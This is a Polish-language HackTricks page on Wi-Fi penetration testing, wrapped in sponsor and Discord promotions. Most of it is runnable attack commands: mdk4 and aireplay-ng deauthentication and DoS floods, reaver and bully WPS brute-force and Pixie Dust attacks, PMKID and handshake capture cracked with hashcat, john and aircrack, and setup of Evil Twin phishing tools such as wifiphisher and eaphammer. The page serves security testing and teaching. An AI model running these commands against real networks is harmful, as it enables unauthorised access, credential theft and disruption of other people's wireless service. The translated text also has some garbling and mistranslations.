# Testowanie penetracyjne Wifi

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Docz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowa si z dowiadczonymi hakerami i owcami nagr贸d za bdy!

**Spostrze偶enia dotyczce hakerstwa**\
Zajmuj si treciami, kt贸re zagbiaj si w emocje i wyzwania hakerstwa

**Aktualnoci na 偶ywo z hakerstwa**\
Bd藕 na bie偶co z szybkim tempem wiata hakerstwa dziki aktualnym wiadomociom i spostrze偶eniom

**Najnowsze ogoszenia**\
Bd藕 na bie偶co z najnowszymi programami bug bounty i wa偶nymi aktualizacjami platformy

**Docz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wsp贸pracowa z najlepszymi hakerami ju偶 dzi!

## Podstawowe polecenia Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
EAPHammer jest narzdziem do atak贸w na sieci Wi-Fi z wykorzystaniem protokou EAP. Pozwala na przeprowadzanie atak贸w typu Evil Twin, Man-in-the-Middle i inne. Narzdzie to jest czsto u偶ywane podczas test贸w penetracyjnych w celu oceny bezpieczestwa sieci Wi-Fi.

Link do repozytorium: [EAPHammer](https://github.com/s0lst1c3/eaphammer)

### Wifiphisher

Wifiphisher jest narzdziem do atak贸w typu phishing na sieci Wi-Fi. Pozwala na przechwytywanie danych uwierzytelniajcych u偶ytkownik贸w poprzez tworzenie faszywych punkt贸w dostpu Wi-Fi. Narzdzie to jest czsto u偶ywane podczas test贸w penetracyjnych w celu oceny bezpieczestwa sieci Wi-Fi.

Link do repozytorium: [Wifiphisher](https://github.com/wifiphisher/wifiphisher)

### Fluxion

Fluxion jest narzdziem do atak贸w typu Evil Twin na sieci Wi-Fi. Pozwala na przechwytywanie danych uwierzytelniajcych u偶ytkownik贸w poprzez tworzenie faszywych punkt贸w dostpu Wi-Fi. Narzdzie to jest czsto u偶ywane podczas test贸w penetracyjnych w celu oceny bezpieczestwa sieci Wi-Fi.

Link do repozytorium: [Fluxion](https://github.com/FluxionNetwork/fluxion)
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon jest zaawansowanym narzdziem do testowania penetracyjnego sieci Wi-Fi. Zosta zaprojektowany w celu uatwienia procesu testowania bezprzewodowego, oferujc szeroki zakres funkcji i mo偶liwoci.

#### Funkcje

- **Ataki WPS**: Airgeddon umo偶liwia przeprowadzanie atak贸w na protok贸 WPS (Wi-Fi Protected Setup), w tym atak贸w offline i online.
- **Ataki Evil Twin**: Narzdzie umo偶liwia tworzenie faszywych punkt贸w dostpu (Evil Twin) w celu przechwycenia danych uwierzytelniajcych.
- **Ataki PMKID**: Airgeddon obsuguje ataki PMKID, kt贸re pozwalaj na zamanie hasa sieci Wi-Fi.
- **Ataki Handshake**: Narzdzie automatyzuje proces przechwytywania i zamania handshake'贸w sieci Wi-Fi.
- **Ataki Deauth**: Airgeddon pozwala na przeprowadzanie atak贸w deautoryzacyjnych, kt贸re mog wyczy urzdzenia podczone do sieci Wi-Fi.
- **Ataki Rouge AP**: Narzdzie umo偶liwia tworzenie faszywych punkt贸w dostpu (Rouge AP) w celu przechwycenia danych uwierzytelniajcych.
- **Ataki Beacon**: Airgeddon pozwala na generowanie faszywych sygna贸w Beacon, kt贸re mog wprowadzi w bd urzdzenia w pobli偶u.
- **Ataki Evil Twin + Rogue AP**: Narzdzie umo偶liwia jednoczesne tworzenie faszywych punkt贸w dostpu (Evil Twin) i faszywych punkt贸w dostpu (Rouge AP).
- **Ataki WEP**: Airgeddon obsuguje ataki na protok贸 WEP (Wired Equivalent Privacy), kt贸ry jest podatny na zamanie.
- **Ataki WPA/WPA2**: Narzdzie umo偶liwia przeprowadzanie atak贸w na protokoy WPA/WPA2 (Wi-Fi Protected Access), kt贸re s najczciej stosowane w sieciach Wi-Fi.

#### Instalacja

Aby zainstalowa Airgeddon, wykonaj nastpujce kroki:

1. Sklonuj repozytorium Airgeddon z GitHuba.
2. Przejd藕 do katalogu Airgeddon.
3. Uruchom skrypt instalacyjny, kt贸ry zainstaluje wszystkie niezbdne zale偶noci.

#### U偶ycie

Po zainstalowaniu Airgeddon, mo偶esz uruchomi narzdzie, wykonujc polecenie `./airgeddon.sh`. Nastpnie postpuj zgodnie z instrukcjami wywietlanymi na ekranie, aby wybra odpowiednie opcje i przeprowadzi ataki na sieci Wi-Fi.

#### Podsumowanie

Airgeddon to pot偶ne narzdzie do testowania penetracyjnego sieci Wi-Fi, kt贸re oferuje wiele funkcji i mo偶liwoci. Dziki niemu mo偶esz przeprowadza r贸偶ne ataki na sieci Wi-Fi, w celu zidentyfikowania potencjalnych saboci i zabezpiecze.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Uruchomienie airgeddon z u偶yciem dockera**

Jeli nie masz zainstalowanego airgeddon na swoim systemie, mo偶esz atwo uruchomi go za pomoc dockera. Docker jest platform, kt贸ra umo偶liwia uruchamianie aplikacji w izolowanych kontenerach, co uatwia zarzdzanie zale偶nociami i rodowiskiem uruchomieniowym.

Aby uruchomi airgeddon za pomoc dockera, wykonaj nastpujce kroki:

1. Upewnij si, 偶e masz zainstalowany docker na swoim systemie. Mo偶esz to sprawdzi, wykonujc polecenie `docker --version` w terminalu. Jeli docker nie jest zainstalowany, zainstaluj go zgodnie z dokumentacj dostpn na stronie https://docs.docker.com/get-docker/.

2. Pobierz obraz dockera airgeddon, wykonujc polecenie:
   ```
   docker pull v1s1t0r1sh3r3/airgeddon
   ```

3. Po pobraniu obrazu, uruchom airgeddon w kontenerze dockera, wykonujc polecenie:
   ```
   docker run -it --net=host --privileged v1s1t0r1sh3r3/airgeddon
   ```

   Opcje `--net=host` i `--privileged` s wymagane, aby umo偶liwi kontenerowi dostp do interfejs贸w sieciowych i uprawnie do monitorowania ruchu sieciowego.

4. Po uruchomieniu kontenera, bdziesz m贸g korzysta z airgeddon tak samo, jakby go mia zainstalowanego na swoim systemie. Mo偶esz wykonywa r贸偶ne ataki na sieci WiFi, przeprowadza audyty bezpieczestwa i wiele innych.

Pamitaj, 偶e korzystanie z airgeddon lub jakiejkolwiek innej aplikacji do cel贸w nielegalnych lub bez zgody waciciela sieci WiFi jest niezgodne z prawem. Upewnij si, 偶e dziaasz zgodnie z obowizujcymi przepisami i zawsze uzyskuj odpowiednie uprawnienia i zgod przed przeprowadzeniem test贸w penetracyjnych.
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Z: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Mo偶e przeprowadza ataki Evil Twin, KARMA i Known Beacons, a nastpnie u偶ywa szablonu phishingowego, aby uzyska rzeczywiste haso sieciowe lub przechwyci dane uwierzytelniajce w sieciach spoecznociowych.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

To narzdzie automatyzuje ataki **WPS/WEP/WPA-PSK**. Automatycznie:

* Ustawia interfejs w tryb monitorowania
* Skanuje mo偶liwe sieci - i pozwala wybra ofiar(y)
* Jeli WEP - uruchamia ataki WEP
* Jeli WPA-PSK
* Jeli WPS: atak Pixie Dust i atak brute-force (bd藕 ostro偶ny, atak brute-force mo偶e zaj du偶o czasu). Nale偶y zauwa偶y, 偶e nie pr贸buje pustego PIN-u ani PIN-贸w generowanych z bazy danych.
* Pr贸buje przechwyci PMKID z AP w celu zamania go
* Pr贸buje deautoryzowa klient贸w AP w celu przechwycenia handshake'u
* Jeli PMKID lub handshake, pr贸buje zama haso przy u偶yciu top5000 hase.

## Podsumowanie atak贸w

* **DoS**
* Pakiety deautoryzacyjne -- Odcz wszystkich (lub okrelony ESSID/Klient)
* Losowe faszywe AP -- Ukrywa sieci, mo偶liwe zablokowanie skaner贸w
* Przeci偶enie AP -- Pr贸ba zniszczenia AP (zazwyczaj mao przydatne)
* WIDS -- Gra z IDS-em
* TKIP, EAPOL -- Kilka konkretnych atak贸w majcych na celu DoS niekt贸rych AP
* **Zamanie**
* Zamanie **WEP** (kilka narzdzi i metod)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** brute force
* \[DoS +] Przechwycenie **WPA handshake** + Zamanie
* **WPA-MGT**
* Przechwycenie **Nazwy u偶ytkownika**
* **Brute-Force** powiadcze
* **Zy bli藕niak** (z lub bez DoS)
* **Otwarty** Zy bli藕niak \[+ DoS] -- Przydatne do przechwycenia danych logowania do portalu przechwytujcego i/lub przeprowadzania atak贸w LAN
* **WPA-PSK** Zy bli藕niak -- Przydatne do atak贸w sieciowych, jeli znasz haso
* **WPA-MGT** -- Przydatne do przechwycenia powiadcze firmowych
* **KARMA, MANA**, **Gony MANA**, **Znany beacon**
* **+ Otwarty** -- Przydatne do przechwycenia danych logowania do portalu przechwytujcego i/lub przeprowadzania atak贸w LAN
* **+ WPA** -- Przydatne do przechwycenia WPA handshake'贸w

## DOS

### Pakiety deautoryzacyjne

**Opis z** [**tutaj**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Ataki **deautoryzacyjne**, powszechna metoda w hakowaniu Wi-Fi, polegaj na faszowaniu ramek "zarzdzajcych", aby **si rozczy urzdzenia z sieci**. Te niezaszyfrowane pakiety wprowadzaj w bd klient贸w, 偶e pochodz one od prawidowej sieci, umo偶liwiajc atakujcym zbieranie handshake'贸w WPA w celu zamania lub trwaego zak贸cania pocze sieciowych. Ta taktyka, zaskakujco prosta, jest szeroko stosowana i ma powa偶ne implikacje dla bezpieczestwa sieciowego.

**Deautoryzacja za pomoc Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 oznacza deautentykacj
* 1 to liczba deautentykacji do wysania (mo偶na wysa ich wiele, jeli chcesz); 0 oznacza wysyanie ich cigle
* \-a 00:14:6C:7E:40:80 to adres MAC punktu dostpu
* \-c 00:0F:B5:34:30:30 to adres MAC klienta do deautentykacji; jeli zostanie pominity, zostanie wysana deautentykacja rozgoszeniowa (nie zawsze dziaa)
* ath0 to nazwa interfejsu

### Pakiety rozczenia

**Pakiety rozczenia**, podobnie jak pakiety deautentykacji, s rodzajem ramek zarzdzania u偶ywanych w sieciach Wi-Fi. Te pakiety su偶 do zerwania poczenia midzy urzdzeniem (takim jak laptop lub smartfon) a punktem dostpu (AP). G贸wna r贸偶nica midzy rozczeniem a deautentykacj polega na ich scenariuszach u偶ycia. Podczas gdy AP emituje **pakiety deautentykacji, aby wyra藕nie usun zoliwe urzdzenia z sieci, pakiety rozczenia s zwykle wysyane, gdy AP jest wyczany, restartowany lub przenoszony, co wymaga odczenia wszystkich podczonych wz贸w**.

**Ten atak mo偶na przeprowadzi za pomoc mdk4 (tryb "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Wicej atak贸w DOS za pomoc mdk4**

**Tutaj** [**znajdziesz**](https://en.kali.tools/?p=864)**.**

**TRYB ATAKU b: Beacon Flooding**

Wysya ramki beacon, aby pokaza faszywe punkty dostpowe klientom. Czasami mo偶e to spowodowa awari skaner贸w sieciowych i nawet sterownik贸w!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**TRYB ATAKU a: Odmowa uwierzytelnienia**

Wysyanie ramek uwierzytelnienia do wszystkich dostpnych punkt贸w dostpu (AP) w zasigu mo偶e przeci偶y te AP, zwaszcza gdy zaanga偶owanych jest wiele klient贸w. Ten intensywny ruch mo偶e prowadzi do niestabilnoci systemu, powodujc zamro偶enie lub nawet resetowanie niekt贸rych AP.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**TRYB ATAKU p: Sondowanie SSID i Bruteforce**

Sondowanie punkt贸w dostpowych (AP) sprawdza, czy SSID jest poprawnie ujawniony i potwierdza zasig AP. Ta technika, w poczeniu z **bruteforcingiem ukrytych SSID** z lub bez listy s贸w, pomaga zidentyfikowa i uzyska dostp do ukrytych sieci.

**TRYB ATAKU m: Wykorzystanie kontramechanizm贸w Michaela**

Wysyanie losowych lub zduplikowanych pakiet贸w do r贸偶nych kolejek QoS mo偶e wywoa kontramechanizmy Michaela na AP **TKIP**, co prowadzi do wyczenia AP na jedn minut. Ta metoda jest efektywn taktyk ataku **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**TRYB ATAKU e: Wstrzykiwanie pakiet贸w EAPOL Start i Logoff**

Zalewanie AP (Access Point) ramkami **EAPOL Start** tworzy **faszywe sesje**, przytaczajc AP i blokujc prawidowych klient贸w. Alternatywnie, wstrzykiwanie **faszywych wiadomoci EAPOL Logoff** si rozcza klient贸w, obie metody skutecznie zak贸caj usug sieciow.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**TRYB ATAKU s: Ataki na sieci siatkowe IEEE 802.11s**

R贸偶ne ataki na zarzdzanie poczeniem i trasowanie w sieciach siatkowych.

**TRYB ATAKU w: Zamieszanie w systemach WIDS**

Poczenie klient贸w z wieloma wzami WDS lub faszywymi rogue AP mo偶e manipulowa systemami wykrywania i zapobiegania wamaniom, tworzc zamieszanie i potencjalne nadu偶ycie systemu.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**TRYB ATAKU f: Fuzzer pakiet贸w**

Fuzzer pakiet贸w oferuje r贸偶norodne 藕r贸da pakiet贸w oraz kompleksowy zestaw modyfikator贸w do manipulacji pakietami.

### **Airggedon**

_**Airgeddon**_ oferuje wikszo atak贸w zaproponowanych w poprzednich komentarzach:

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS (Wi-Fi Protected Setup) upraszcza proces podczania urzdze do routera, zwikszajc szybko i atwo konfiguracji dla sieci zaszyfrowanych za pomoc **WPA** lub **WPA2** Personal. Jest nieskuteczny dla atwo podatnego zabezpieczenia WEP. WPS wykorzystuje 8-cyfrowy PIN, kt贸ry jest sprawdzany w dw贸ch czciach, co czyni go podatnym na ataki brute-force ze wzgldu na ograniczon liczb kombinacji (11 000 mo偶liwoci).

### Brute-force WPS

Istniej 2 g贸wne narzdzia do wykonania tej akcji: Reaver i Bully.

* **Reaver** zosta zaprojektowany jako solidny i praktyczny atak na WPS i zosta przetestowany na r贸偶norodnych punktach dostpu i implementacjach WPS.
* **Bully** to **nowa implementacja** ataku brute-force na WPS, napisana w jzyku C. Ma kilka zalet w por贸wnaniu do oryginalnego kodu reavera: mniejsze zale偶noci, poprawion wydajno pamici i procesora, poprawne obsugiwanie kolejnoci bajt贸w i bardziej rozbudowany zestaw opcji.

Atak wykorzystuje podatno **PIN-u WPS**, zwaszcza jego ujawnienie pierwszych czterech cyfr oraz rol ostatniej cyfry jako sumy kontrolnej, uatwiajc atak brute-force. Jednak obrona przed atakami brute-force, takie jak **blokowanie adres贸w MAC** agresywnych atakujcych, wymaga **rotacji adres贸w MAC**, aby kontynuowa atak.

Po uzyskaniu PIN-u WPS za pomoc narzdzi takich jak Bully lub Reaver, atakujcy mo偶e wydedukowa WPA/WPA2 PSK, zapewniajc **trway dostp do sieci**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Inteligentne Brute Force**

Ta udoskonalona metoda koncentruje si na atakowaniu PIN-贸w WPS przy u偶yciu znanych podatnoci:

1. **Wczeniej odkryte PIN-y**: Wykorzystaj baz danych znanych PIN-贸w powizanych z konkretnymi producentami, kt贸rzy stosuj jednolite PIN-y WPS. Baza danych ta zestawia pierwsze trzy oktety adres贸w MAC z prawdopodobnymi PIN-ami dla tych producent贸w.
2. **Algorytmy generowania PIN-贸w**: Wykorzystaj algorytmy takie jak ComputePIN i EasyBox, kt贸re obliczaj PIN-y WPS na podstawie adresu MAC punktu dostpowego (AP). Dodatkowo, algorytm Arcadyan wymaga identyfikatora urzdzenia, co dodaje kolejny etap do procesu generowania PIN-贸w.

### Atak WPS Pixie Dust

**Dominique Bongard** odkry wady niekt贸rych punkt贸w dostpowych (AP), dotyczce tworzenia tajnych kod贸w, znanych jako **nonces** (**E-S1** i **E-S2**). Jeli te nonces zostan odkryte, atwo jest zama PIN WPS AP. AP ujawnia PIN w specjalnym kodzie (hash), aby udowodni, 偶e jest on prawidowy i nie jest faszywym (rogue) AP. Te nonces s w zasadzie "kluczami" do odblokowania "sejfu", w kt贸rym przechowywany jest PIN WPS. Wicej informacji na ten temat mo偶na znale藕 [tutaj](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

W prostych sowach, problem polega na tym, 偶e niekt贸re AP nie u偶ywaj wystarczajco losowych kluczy do szyfrowania PIN-u podczas procesu poczenia. Sprawia to, 偶e PIN jest podatny na zgadywanie spoza sieci (atak brute force offline).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Atak Null Pin

Niekt贸re 藕le zaprojektowane systemy pozwalaj nawet na dostp za pomoc **Null PIN** (pustego lub nieistniejcego PIN-u), co jest do nietypowe. Narzdzie **Reaver** jest zdolne do testowania tej podatnoci, w przeciwiestwie do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Wszystkie proponowane ataki WPS mo偶na atwo przeprowadzi za pomoc _**airgeddon**_.

![](<../../.gitbook/assets/image (124).png>)

* 5 i 6 pozwalaj spr贸bowa **wasnego PIN-u** (jeli masz taki)
* 7 i 8 wykonuj atak **Pixie Dust**
* 13 pozwala przetestowa **pusty PIN**
* 11 i 12 zbieraj **PIN-y zwizane z wybranym AP z dostpnych baz danych** i **generuj** mo偶liwe **PIN-y** za pomoc: ComputePIN, EasyBox i opcjonalnie Arcadyan (zalecane, dlaczego nie?)
* 9 i 10 testuj **wszystkie mo偶liwe PIN-y**

## **WEP**

Obecnie zepsute i nieu偶ywane. Warto wiedzie, 偶e _**airgeddon**_ ma opcj WEP o nazwie "All-in-One", kt贸ra atakuje tego rodzaju zabezpieczenia. Wicej narzdzi oferuje podobne opcje.

![](<../../.gitbook/assets/image (125).png>)


***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Docz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowa si z dowiadczonymi hakerami i owcami bd贸w!

**Wgld w Hacking**\
Zajmuj si treciami, kt贸re zagbiaj si w emocje i wyzwania zwizane z hakowaniem

**Aktualnoci o Hackingu na 呕ywo**\
Bd藕 na bie偶co z szybkim tempem wiata hakowania dziki aktualnym wiadomociom i wgldom

**Najnowsze Ogoszenia**\
Bd藕 na bie偶co z najnowszymi programami bug bounty i wa偶nymi aktualizacjami platformy

**Docz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wsp贸pracowa z najlepszymi hakerami ju偶 dzi!

***


## WPA/WPA2 PSK

### PMKID

W 2018 roku **hashcat** [ujawni](https://hashcat.net/forum/thread-7717.html) now metod ataku, kt贸ra jest wyjtkowa, poniewa偶 wymaga tylko **jednego pakietu** i nie wymaga, aby jakiekolwiek klienty byy podczone do celowego AP - wystarczy interakcja midzy atakujcym a AP.

Wiele nowoczesnych router贸w dodaje **opcjonalne pole** do **pierwszej ramki EAPOL** podczas czenia, znane jako `Robust Security Network`. Zawiera ono `PMKID`.

Jak wyjania oryginalny post, **PMKID** jest tworzony przy u偶yciu znanych danych:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Podczas gdy "Nazwa PMK" jest staa, znamy BSSID punktu dostpu i stacji, a `PMK` jest identyczny jak w penym 4-etapowym handshake'u, **hashcat** mo偶e wykorzysta te informacje do zamania PSK i odzyskania hasa!

Aby **zbiera** te informacje i **przeprowadzi** lokalnie atak brutalny na haso, mo偶esz wykona:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**Zapane PMKID-y** zostan wywietlone w **konsoli** oraz **zapisane** wewntrz \_ **/tmp/attack.pcap**\_\
Teraz przekonwertuj przechwycenie do formatu **hashcat/john** i zam go:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Prosz zauwa偶y, 偶e poprawny format prawidowego skr贸tu zawiera **4 czci**, na przykad: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`
Jeli tw贸j skr贸t zawiera **tylko 3 czci**, to jest **nieprawidowy** (przechwycenie PMKID nie byo prawidowe).

Zauwa偶, 偶e `hcxdumptool` **r贸wnie偶 przechwytuje handshake'y** (co takiego pojawi si: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Mo偶esz **przeksztaci** handshake'y do formatu **hashcat**/**john** za pomoc `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Zauwa偶yem, 偶e niekt贸re uchwycone potwierdzenia z tym narzdziem nie mog zosta zamane, nawet jeli znamy poprawne haso. Zalecam przechwytywanie potwierdze r贸wnie偶 tradycyjnym sposobem, jeli to mo偶liwe, lub przechwytywanie kilku z nich za pomoc tego narzdzia._

### Przechwytywanie potwierdze

Atak na sieci **WPA/WPA2** mo偶na przeprowadzi, przechwytujc **potwierdzenie** i pr贸bujc **zama** haso **offline**. Proces ten polega na monitorowaniu komunikacji konkretnej sieci i **BSSID** na okrelonym **kanale**. Oto uproszczony przewodnik:

1. Zidentyfikuj **BSSID**, **kana** i **podczonego klienta** docelowej sieci.
2. U偶yj polecenia `airodump-ng`, aby monitorowa ruch sieciowy na okrelonym kanale i BSSID, w nadziei na przechwycenie potwierdzenia. Polecenie bdzie wyglda tak:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Aby zwikszy szans na przechwycenie handshake'u, chwilowo rozcz klienta z sieci, aby wymusi ponown autoryzacj. Mo偶na to zrobi za pomoc polecenia `aireplay-ng`, kt贸re wysya pakiety deautoryzacyjne do klienta:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Nale偶y zauwa偶y, 偶e gdy klient zostanie wylogowany, mo偶e pr贸bowa poczy si z innym punktem dostpowym lub, w innych przypadkach, z inn sieci._

Gdy w `airodump-ng` pojawi si informacje o handshake, oznacza to, 偶e handshake zosta przechwycony i mo偶na zakoczy nasuchiwanie:

![](<../../.gitbook/assets/image (172) (1).png>)

Po przechwyceniu handshake mo偶na go **ama** przy u偶yciu `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Sprawd藕, czy w pliku znajduje si handshake

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark** jest narzdziem wiersza polece, kt贸re jest czci pakietu Wireshark. Su偶y do analizy ruchu sieciowego przechwyconego przez interfejs sieciowy lub wczytanego z pliku. Mo偶e by u偶ywany do monitorowania i debugowania sieci, a tak偶e do wykrywania i analizy atak贸w sieciowych. Tshark oferuje wiele funkcji, takich jak filtrowanie pakiet贸w, analiza protoko贸w, generowanie statystyk i wiele innych. Jest to pot偶ne narzdzie, kt贸re mo偶e by wykorzystane w celach pentestingu i badania bezpieczestwa sieci.
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Jeli narzdzie to znajdzie niekompletny handshake ESSID przed kompletnym, nie wykryje poprawnego._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

W **firmowych konfiguracjach WiFi spotkasz si z r贸偶nymi metodami uwierzytelniania**, z kt贸rych ka偶da zapewnia r贸偶ne poziomy bezpieczestwa i funkcje zarzdzania. Podczas korzystania z narzdzi takich jak `airodump-ng` do analizy ruchu sieciowego, mo偶esz zauwa偶y identyfikatory tych typ贸w uwierzytelniania. Niekt贸re powszechne metody to:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Ta metoda obsuguje tokeny sprztowe i jednorazowe hasa w ramach EAP-PEAP. W przeciwiestwie do MSCHAPv2, nie u偶ywa wyzwania dla klienta i wysya hasa w postaci zwykego tekstu do punktu dostpu, co stanowi ryzyko atak贸w downgrade.

2. **EAP-MD5 (Message Digest 5)**:
- Polega na wysyaniu skr贸tu MD5 hasa przez klienta. **Nie jest zalecane** ze wzgldu na podatno na ataki sownikowe, brak uwierzytelniania serwera i brak mo偶liwoci generowania sesyjnych kluczy WEP.

3. **EAP-TLS (Transport Layer Security)**:
- Wykorzystuje zar贸wno certyfikaty po stronie klienta, jak i serwera do uwierzytelniania i mo偶e dynamicznie generowa klucze WEP oparte na u偶ytkowniku i sesji w celu zabezpieczenia komunikacji.

4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Zapewnia uwierzytelnianie wzajemne za pomoc tunelu szyfrowanego oraz metody do generowania dynamicznych, u偶ytkownikowych, sesyjnych kluczy WEP. Wymaga tylko certyfikat贸w po stronie serwera, a klienci u偶ywaj powiadcze.

5. **PEAP (Protected Extensible Authentication Protocol)**:
- Dziaa podobnie jak EAP, tworzc tunel TLS do chronionej komunikacji. Pozwala na u偶ycie sabszych protoko贸w uwierzytelniania na szczycie EAP dziki ochronie oferowanej przez tunel.
* **PEAP-MSCHAPv2**: Czsto nazywane PEAP, czy podatny mechanizm wyzwania/odpowiedzi MSCHAPv2 z ochronnym tunelem TLS.
